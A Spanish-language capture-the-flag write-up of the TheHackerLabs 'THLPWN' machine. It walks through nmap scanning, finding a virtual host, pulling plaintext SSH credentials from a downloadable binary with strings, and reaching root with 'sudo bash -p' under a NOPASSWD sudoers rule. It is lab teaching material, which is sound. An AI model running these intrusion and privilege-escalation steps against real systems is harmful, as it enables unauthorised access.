---
title: "THLPWN - TheHackerLabs"
date: 2026-04-20
draft: false
slug: "THL-writeup-thlpwn"
excerpt: "Esta fue una máquina bastante sencilla. Después de analizar los escaneos, nos dirigimos a la página web activa en el puerto 80, en donde vemos un mensaje que nos indica que debemos buscar el hostname correcto para que cargue correctamente la página web, pues esta utiliza Virtual Hosting. Encontramos el hostname en el código fuente y lo registramos en el /etc/hosts, siendo que ya carga correctamente la página web. Aquí encontraremos algunas rutas interesantes, siendo una de estas la que nos permite descargar un binario. Analizamos el contenido del binario y podemos ver credenciales en texto claro para entrar al servicio SSH, logrando así ganar acceso a la máquina víctima. Dentro, revisamos los privilegios de nuestro usuario y descubrimos que puede usar el binario Bash como Root, que al investigarlo en la guía de GTFOBins, encontramos una forma de escalar privilegios."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "SSH", "Virtual Hosting", "Source Code Analysis", "Web Enumeration", "Binary Analysis", "Plaintext Credentials Exposure in Binary", "Abusing Sudoers Privileges On Bash Binary", "Privesc - Abusing Sudoers Privileges On Bash Binary", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "echo"
  - "file"
  - "strings"
  - "head"
  - "tail"
  - "nxc"
  - "ssh"
  - "sudo"
  - "bash"
links:
  - "https://gtfobins.org/gtfobins/bash/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-thlpwn/thlpwn.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.240
PING 192.168.100.240 (192.168.100.240) 56(84) bytes of data.
64 bytes from 192.168.100.240: icmp_seq=1 ttl=64 time=1.55 ms
64 bytes from 192.168.100.240: icmp_seq=2 ttl=64 time=0.955 ms
64 bytes from 192.168.100.240: icmp_seq=3 ttl=64 time=1.13 ms
64 bytes from 192.168.100.240: icmp_seq=4 ttl=64 time=0.964 ms

--- 192.168.100.240 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3053ms
rtt min/avg/max/mdev = 0.955/1.150/1.551/0.241 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.240 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-20 11:23 -0600
Initiating ARP Ping Scan at 11:23
Scanning 192.168.100.240 [1 port]
Completed ARP Ping Scan at 11:23, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:23
Scanning 192.168.100.240 [65535 ports]
Discovered open port 22/tcp on 192.168.100.240
Discovered open port 80/tcp on 192.168.100.240
Completed SYN Stealth Scan at 11:24, 39.41s elapsed (65535 total ports)
Nmap scan report for 192.168.100.240
Host is up, received arp-response (0.00075s latency).
Scanned at 2026-04-20 11:23:44 CST for 39s
Not shown: 47846 closed tcp ports (reset), 17687 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.63 seconds
           Raw packets sent: 90937 (4.001MB) | Rcvd: 49323 (1.973MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente tenemos 2 puertos abiertos, así que supongo que la intrusión será por la página web del **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.100.240 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-20 11:22 -0600
Nmap scan report for 192.168.100.240
Host is up (0.00100s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)

| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    nginx 1.22.1

|_http-server-header: nginx/1.22.1
|_http-title: 403 Forbidden
MAC Address: XX (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Veo que la página web del **puerto 80** utiliza **Nginx** y parece que muestra un mensaje de un código de estado **403 Forbidden**.

Vayamos a analizar esa página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura1.png">
</p>

Nos están dando un mensaje en donde se nos da una pista; debemos encontrar el hostname para entrar a la aplicación correctamente.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura2.png">
</p>

No hay mucho que destacar, solo el uso de **Nginx**.

Si revisamos el código fuente de la página web, encontraremos un comentario en las líneas del **CSS**:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura3.png">
</p>

Hemos encontrado el hostname que se nos pedía, así que vamos a registrarlo en el `/etc/hosts`:
```bash
echo "192.168.100.240 thlpwn.thl" >> /etc/hosts
```

Y entra en ese dominio:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura4.png">
</p>

Excelente, ya podemos ver correctamente la página web.

### Analizando Página Web THLPWN {#Thlpwn}

Desde la página principal, podemos visualizar algunos campos y links de interés:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura5.png">
</p>

Tenemos:
* Un campo que parece aplicar consultas a una base de datos.
* Algunas subpáginas que podemos revisar.
* Tenemos varios campos que podemos probar si son vulnerables.

Pero antes de aplicar cualquier inyección, vamos a analizar el comportamiento de la página web, todas las rutas (subpáginas) y el código fuente.

Vamos a realizar una consulta de prueba para ver que es lo qué pasa:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura6.png">
</p>

Observa la respuesta que obtenemos:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura7.png">
</p>

Esto quiere decir que no se tiene una conexión con la base de datos de **SQL**. Además, podemos ver que el buscador es un script de **PHP**.

Ahora, vayamos al **Admin Panel**:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura8.png">
</p>

Parece que no tenemos acceso, pero si revisamos el código fuente, encontraremos una ruta para un panel de administrador:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura9.png">
</p>

Si entramos a esa ruta, encontraremos que el panel está en desarrollo:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura10.png">
</p>

Y en su código fuente veremos un comentario que indica que se debe consultar el **contenedor de Docker** para tener acceso a la metadata de la base de datos:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura11.png">
</p>

Bien, si nos dirigimos a **API Documentation**, veremos que existen dos endpoints de APIs:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura12.png">
</p>

El problema es que no están habilitados para usarse, pues si tratas de aplicarle **Fuzzing** para descubrir más endpoints, no encontrarás nada.

Ahora, vayamos a la página **Downloads**:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura13.png">
</p>

Observa todo lo que nos menciona:
* Podemos descargar un binario de **Linux**, que contiene vulnerabilidades.
* Una vez que lo descargas, nos da instrucciones sobre cómo analizar el binario.
* Cuando se vulnere el binario, mostrará las credenciales para entrar al **servicio SSH**.

Ya tenemos algo que analizar.

Por último, podemos entrar al archivo **robots.txt** y ahí encontraremos lo siguiente:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura14.png">
</p>

Parecen ser pistas de que la página es vulnerable a **Inyecciones SQL**, pero ya vimos que esto no puede ser posible.

Analicemos el binario que podemos descargar.

## Explotación de Vulnerabilidades {#Explotacion}

### Análizando Contenido de Binario y Ganando Acceso a la Máquina Víctima Vía SSH {#Binario}

Una vez que lo tengas descargado, vamos a identificar el tipo de archivo con el comando **file**:
```bash
file auth_checker
auth_checker: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, too large section header offset 241239588864
```
Confirmamos que es un binario de **Linux**.

Tratemos de ver el contenido del binario con el comando **strings**:
```bash
strings auth_checker | head -n 45 | tail -n 22
   THLPWN Authentication Checker      
   Version 1.0 - Secure System        
 VULNERABILITY EXPLOITED SUCCESSFULLY! 
  SSH Access Credentials:
  ========================
  Username: thluser
  Password: 9Kx7mP2wQ5nL8vT4bR6zY
  Connect with:
  ssh thluser@xxx.xxx.xxx.xxx
  First Flag Location:
  cat ~/flag.txt
[*] Enter authentication code: 
[!] Buffer overflow detected!
[!] Security check bypassed!
[-] Access Denied
[?] Hint: Try a longer input (60+ characters)...
[*] Enter password: 
Th3M4st3rK3y2024
[+] Correct password!
[-] Incorrect password
[?] Hint: The password is hardcoded in the binary...
[?] Try: strings auth_checker | grep -i key
```
Observa que podemos ver las credenciales para entrar al **servicio SSH**.

Comprobemos si funcionan con **netexec**:
```bash
nxc ssh 192.168.100.240 -u 'thluser' -p '**********'
SSH         192.168.100.240   22     192.168.100.240    [*] SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7
SSH         192.168.100.240   22     192.168.100.240    [+] thluser:**********  Linux - Shell access!
```
Funcionan.

Entremos al **servicio SSH**:
```bash
ssh thluser@192.168.100.240
thluser@192.168.100.240's password: 
Linux thlpwn 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
...
Last login: Tue Apr 21 00:33:03 2026
thluser@thlpwn:~$
thluser@thlpwn:~$ whoami
thluser
```
Estamos dentro.

Aquí encontraremos la flag del usuario:
```bash
thluser@thlpwn:~$ ls
flag.txt
thluser@thlpwn:~$ cat flag.txt
...
```

## Post Explotación {#Post}

### Abusando de Permisos Sudoers Sobre Binario bash para Escalar Privilegios {#Bash}

Veamos qué privilegios tiene nuestro usuario:
```bash
thluser@thlpwn:~$ sudo -l
Matching Defaults entries for thluser on thlpwn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User thluser may run the following commands on thlpwn:
    (ALL) NOPASSWD: /bin/bash
```
Excelente, podemos usar la **Bash** como el usuario **Root**.

Esto nos facilita en gran medida el poder escalar privilegios, ya que solamente debemos usar la **Bash** con privilegios (`-p`) para convertirnos en **Root**.

Observa todo lo que podemos hacer gracias a la guía de **GTFOBins**:
* <a href="https://gtfobins.org/gtfobins/bash/" target="_blank">GTFOBins: Bash</a>

Usaremos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-thlpwn/Captura15.png">
</p>

Probémoslo:
```bash
thluser@thlpwn:~$ sudo bash -p
root@thlpwn:/home/thluser# whoami
root
```
Somos **Root**.

Busquemos la última flag:
```bash
root@thlpwn:/home/thluser# cd /root
root@thlpwn:~# ls
root.txt
root@thlpwn:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
